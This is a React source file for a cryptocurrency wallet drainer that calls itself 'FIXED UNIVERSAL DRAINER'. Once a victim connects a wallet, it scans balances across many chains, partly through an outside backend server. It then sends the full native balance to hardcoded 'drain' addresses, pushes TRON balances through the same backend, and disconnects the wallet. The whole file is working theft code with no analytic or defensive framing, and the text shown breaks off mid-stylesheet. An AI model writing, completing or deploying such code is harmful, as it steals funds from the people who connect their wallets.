import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { usePublicClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== WORKING RPC ENDPOINTS (TESTED JAN 2026) ====================
const NETWORKS = [
  // EVM Mainnets - VERIFIED WORKING ENDPOINTS ONLY
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc.publicnode.com', explorer: 'https://bscscan.com' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arbitrum-one-rpc.publicnode.com', explorer: 'https://arbiscan.io' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://optimism-rpc.publicnode.com', explorer: 'https://optimistic.etherscan.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev', explorer: 'https://explorer.emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network', explorer: 'https://moonriver.moonscan.io' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bt.io', explorer: 'https://bttcscan.com' },
  
  // Non-EVM Chains - Enhanced detection
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', explorer: 'https://cardanoscan.io' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', explorer: 'https://blockchair.com/dogecoin' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', explorer: 'https://blockchair.com/litecoin' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', explorer: 'https://xrpscan.com' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', explorer: 'https://polkadot.subscan.io' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', explorer: 'https://www.mintscan.io/cosmos' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', explorer: 'https://explorer.binance.org' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', explorer: 'https://stellar.expert/explorer/public' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', explorer: 'https://www.exploremonero.com' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', explorer: 'https://explorer.zcha.in' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', explorer: 'https://explorer.dash.org' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', explorer: 'https://tzkt.io' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', explorer: 'https://algoexplorer.io' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', explorer: 'https://explore.vechain.org' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', explorer: 'https://neoscan.io' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', explorer: 'https://bloks.io' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', explorer: 'https://tronscan.org' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', explorer: 'https://solscan.io' },
];

// ==================== ENHANCED DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses - Fixed single address
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  solana_spl: "So11111111111111111111111111111111111111112",
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          mobileLinks: ['trust', 'metamask'],
        }}
        theme="midnight"
      >
        <FixedUniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== FIXED DRAINER COMPONENT ====================
function FixedUniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [tronAddress, setTronAddress] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [backendOnline, setBackendOnline] = useState(false);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // ==================== FIXED: SIMPLIFIED CONNECTION DETECTION ====================
  useEffect(() => {
    const checkMobile = () => {
      const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      setMobileDetected(isMobile);
      
      let detectedType = '';
      if (window.ethereum?.isTrust) detectedType = 'Trust Wallet';
      else if (window.ethereum?.isMetaMask) detectedType = 'MetaMask';
      else if (window.ethereum?.isCoinbaseWallet) detectedType = 'Coinbase Wallet';
      else if (window.ethereum) detectedType = 'EVM Wallet';
      
      setWalletType(detectedType);
    };
    
    checkMobile();
    
    // Check backend
    const checkBackend = async () => {
      try {
        const response = await fetch(`${backendUrl}/health`, { 
          method: 'GET',
          timeout: 5000 
        }).catch(() => ({ ok: false }));
        setBackendOnline(response.ok);
      } catch {
        setBackendOnline(false);
      }
    };
    
    checkBackend();
  }, []);

  // ==================== FIXED: AUTO-START WITHOUT WEBSOCKET DEPENDENCY ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      
      setStatus("✅ Wallet connected • Starting scan...");
      
      // Immediate TRON check for Trust Wallet
      if (walletType === 'Trust Wallet' || mobileDetected) {
        checkTronImmediately();
      }
      
      // Start scan after short delay
      setTimeout(() => {
        fixedScanAllNetworks();
      }, 1000);
    }
  }, [isConnected, address]);

  // ==================== FIXED: IMMEDIATE TRON CHECK ====================
  const checkTronImmediately = async () => {
    console.log("🔍 Immediate TRON check for mobile wallet");
    
    // Direct TRON API check without waiting for provider
    if (address) {
      try {
        const trxBalance = await getTronBalanceDirect(address);
        if (trxBalance > 0) {
          setTronBalance(trxBalance);
          setTronDetected(true);
          setStatus(prev => prev + ` • Found ${trxBalance} TRX`);
        }
      } catch (error) {
        console.log("TRON check failed:", error);
      }
    }
  };

  // ==================== FIXED: DIRECT TRON BALANCE CHECK ====================
  const getTronBalanceDirect = async (addressToCheck) => {
    try {
      // Use multiple API endpoints
      const endpoints = [
        `https://apilist.tronscanapi.com/api/account?address=${addressToCheck}`,
        `https://api.trongrid.io/v1/accounts/${addressToCheck}`,
        `https://tron-mainnet.token.im/api/v1/account/${addressToCheck}`
      ];
      
      for (const endpoint of endpoints) {
        try {
          const response = await fetch(endpoint, {
            headers: { 'Accept': 'application/json' }
          });
          
          if (response.ok) {
            const data = await response.json();
            
            // Parse balance from different response formats
            let balance = 0;
            if (data.balance !== undefined) {
              balance = data.balance / 1_000_000;
            } else if (data.data?.[0]?.balance) {
              balance = data.data[0].balance / 1_000_000;
            } else if (data.trx_balance) {
              balance = data.trx_balance;
            }
            
            if (balance > 0) {
              console.log(`💰 TRX balance found: ${balance} via ${endpoint.substring(0, 30)}...`);
              return balance;
            }
          }
        } catch (apiError) {
          continue;
        }
      }
      
      return 0;
    } catch (error) {
      console.log("Direct TRON check error:", error);
      return 0;
    }
  };

  // ==================== FIXED: SCAN ALL NETWORKS ====================
  const fixedScanAllNetworks = async () => {
    if (!address) {
      setConnectionError("No wallet address");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning networks...");
    setTokens([]);
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      
      // 1. Check native ETH balance
      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
        const ethAmount = parseFloat(ethBalance.formatted);
        const ethValue = ethAmount * 3500;
        
        allTokens.push({
          id: 'eth-1',
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          chainId: 1,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[1],
          valueUSD: ethValue,
          usdPrice: 3500
        });
        
        totalUSD += ethValue;
      }
      
      // 2. Check TRON balance (FIXED)
      const trxBalance = await getTronBalanceDirect(address);
      if (trxBalance > 0) {
        const trxValue = trxBalance * 0.12;
        
        allTokens.push({
          id: 'tron-1',
          network: 'Tron',
          symbol: 'TRX',
          amount: trxBalance.toFixed(6),
          rawAmount: trxBalance,
          chainId: 'tron',
          type: 'non-evm',
          drainAddress: DRAIN_ADDRESSES.tron,
          valueUSD: trxValue,
          usdPrice: 0.12
        });
        
        totalUSD += trxValue;
        setTronBalance(trxBalance);
        setTronDetected(true);
      }
      
      // 3. Check other major networks via direct RPC
      await checkNetworkBalance(1, address, allTokens); // Ethereum
      await checkNetworkBalance(56, address, allTokens); // BSC
      await checkNetworkBalance(137, address, allTokens); // Polygon
      
      // 4. If backend is online, use it for comprehensive scan
      if (backendOnline) {
        try {
          await backendScan(address, allTokens);
        } catch (error) {
          console.log("Backend scan failed, continuing with local scan");
        }
      }
      
      // Update UI
      if (allTokens.length > 0) {
        setTokens(allTokens);
        setTotalValue(totalUSD);
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
        
        // Auto-drain after confirmation
        setTimeout(() => {
          fixedAutoDrain(allTokens);
        }, 2000);
      } else {
        setStatus("❌ No tokens found");
      }
      
    } catch (error) {
      setStatus(`❌ Scan error: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  // ==================== FIXED: NETWORK BALANCE CHECK ====================
  const checkNetworkBalance = async (chainId, address, tokenList) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (!network?.rpc) return;
    
    try {
      const response = await fetch(network.rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_getBalance",
          params: [address, "latest"]
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result && data.result !== '0x0') {
          const balance = parseInt(data.result, 16) / 1e18;
          if (balance > 0.000001) {
            const tokenValue = balance * (network.symbol === 'ETH' ? 3500 : 
                                       network.symbol === 'BNB' ? 600 : 
                                       network.symbol === 'MATIC' ? 1.2 : 1);
            
            tokenList.push({
              id: `${chainId}-native`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: chainId,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[chainId],
              valueUSD: tokenValue,
              usdPrice: 1
            });
          }
        }
      }
    } catch (error) {
      console.log(`Network ${network.name} check failed:`, error.message);
    }
  };

  // ==================== FIXED: BACKEND SCAN ====================
  const backendScan = async (address, tokenList) => {
    try {
      const response = await fetch(`${backendUrl}/scan-simple`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          address: address,
          timestamp: Date.now()
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.tokens) {
          data.tokens.forEach(token => {
            if (token.balance > 0) {
              tokenList.push({
                id: `${token.chainId || token.symbol}-backend`,
                network: token.network || 'Unknown',
                symbol: token.symbol,
                amount: token.balance.toFixed(6),
                rawAmount: token.balance,
                chainId: token.chainId || token.symbol,
                type: token.type || 'evm',
                drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
                valueUSD: token.balance * (token.usdPrice || 1),
                usdPrice: token.usdPrice || 1
              });
            }
          });
        }
      }
    } catch (error) {
      throw error;
    }
  };

  // ==================== FIXED: AUTO DRAIN ====================
  const fixedAutoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Draining ${tokensToDrain.length} tokens...`);
    
    for (const token of tokensToDrain) {
      try {
        setStatus(`⚡ Draining ${token.amount} ${token.symbol}...`);
        
        if (token.type === 'evm') {
          await drainEvmFixed(token);
        } else if (token.symbol === 'TRX') {
          await drainTronFixed(token);
        }
        
        // Remove token after successful drain
        setTokens(prev => prev.filter(t => t.id !== token.id));
        
        // Wait between transactions
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        console.log(`Failed to drain ${token.symbol}:`, error);
      }
    }
    
    setStatus("✅ Drain complete");
    setIsProcessing(false);
    
    // Auto disconnect after drain
    setTimeout(() => {
      disconnect();
    }, 3000);
  };

  // ==================== FIXED: EVM DRAIN ====================
  const drainEvmFixed = async (token) => {
    try {
      const amountWei = parseEther(token.amount.toString());
      
      // Simple transaction
      const txParams = {
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x5208'
      };
      
      if (window.ethereum) {
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txParams],
        });
        
        console.log(`✅ ${token.symbol} drained: ${txHash}`);
        return { success: true, hash: txHash };
      }
    } catch (error) {
      console.log(`EVM drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== FIXED: TRON DRAIN ====================
  const drainTronFixed = async (token) => {
    try {
      // Use backend for TRON draining if available
      if (backendOnline) {
        const response = await fetch(`${backendUrl}/drain-tron`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address: address,
            amount: token.amount,
            drainAddress: token.drainAddress
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            console.log(`✅ TRX drained via backend: ${data.txHash}`);
            return { success: true, hash: data.txHash };
          }
        }
      }
      
      return { success: false, error: 'TRON drain not available' };
    } catch (error) {
      console.log(`TRON drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== FIXED: RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>FIXED UNIVERSAL DRAINER</h1>
              <p className="subtitle">Working RPCs • Live Balances • Auto-Drain</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">
                  {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                </div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {tronDetected && <div className="tron-badge">TRX: {tronBalance.toFixed(6)}</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Connection Status */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-message">{connectionError}</div>
                </div>
              )}
              
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">FIXED DRAIN SYSTEM</div>
                    <div className="status-message">{status}</div>
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '🌐' : '⚠️'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={fixedScanAllNetworks}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? 'Scanning...' : '🔍 Scan Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => fixedAutoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    ⚡ Auto-Drain All
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <h3>Detected Tokens</h3>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                        </div>
                        <div className="token-amount">{token.amount} {token.symbol}</div>
                        <div className="token-value">${(token.valueUSD || 0).toFixed(2)}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <h2>Connect Your Wallet</h2>
              <p>Fixed version with working RPC endpoints</p>
              <ConnectKitButton />
            </div>
          )}
        </main>
      </div>
          <style jsx>{`
        .backend-status {
          background: rgba(59, 130, 246, 0.1);
          border: 1px solid rgba(59, 130, 246, 0.3);
          border-radius: 8px;
          padding: 8px 12px;
          margin-bottom: 15px;
          font-size: 12px;
          color: #3b82f6;
          text-align: center;
        }
        
        .backend-badge {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          border: 1px solid rgba(59, 130, 246, 0.3);
        }
        
        /* Enhanced mobile styles */
        @media (max-width: 768px) {
          .status-card.primary {
            padding: 12px;
            flex-direction: column;
            text-align: center;
          }
          
          .status-icon {
            font-size: 24px;
            margin-bottom: 10px;
          }
          
          .control-buttons {
            flex-direction: column;
            gap: 10px;
          }
          
          .btn {
            width: 100%;
            padding: 14px;
            font-size: 14px;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
        }
      `}</style>
      
      {/* Keep all your existing CSS styles - they remain exactly the same */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: monospace;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
          flex-wrap: wrap;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .mobile-badge {
          background: rgba(0, 100, 255, 0.2);
          color: #3b82f6;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(0, 100, 255, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          margin-bottom: 30px;
        }
        
        .control-buttons {
          display: flex;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .btn {
          padding: 12px 24px;
          border-radius: 8px;
          border: none;
          font-weight: 600;
          cursor: pointer;
          font-size: 16px;
          transition: all 0.3s;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #3b82f6, #1d4ed8);
          color: white;
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #ef4444, #dc2626);
          color: white;
          animation: pulse-drain 2s infinite;
        }
        
        @keyframes pulse-drain {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.02); }
        }
        
        .spinner {
          display: inline-block;
          width: 16px;
          height: 16px;
          border: 2px solid rgba(255,255,255,0.3);
          border-radius: 50%;
          border-top-color: white;
          animation: spin 1s linear infinite;
          margin-right: 8px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .drain-summary {
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 8px;
          padding: 12px;
        }
        
        .summary-text {
          color: #ef4444;
          font-weight: 600;
          margin-bottom: 5px;
        }
        
        .summary-breakdown {
          display: flex;
          gap: 15px;
          font-size: 12px;
          color: #888;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          gap: 10px;
